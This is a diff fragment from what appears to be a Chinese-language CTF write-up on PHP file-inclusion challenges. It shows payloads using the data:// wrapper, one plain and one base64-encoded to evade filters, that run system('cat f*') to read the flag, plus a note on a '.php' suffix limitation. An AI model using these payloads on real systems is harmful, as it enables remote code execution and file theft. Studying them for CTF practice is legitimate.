@@ -42,7 +42,7 @@ file_get_contents($_GET['2333']) === 'todat is a happy day'
 代码执行获取flag
 payload：?c=data://text/plain,<?php system('cat f*');?>
 防止过滤一下：?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==
-但是结尾有.php的：include($c.".php"); 编码后会失效。
+但是结尾有.php的情况：include($c.".php"); 编码后会失效。
 
 ```
 
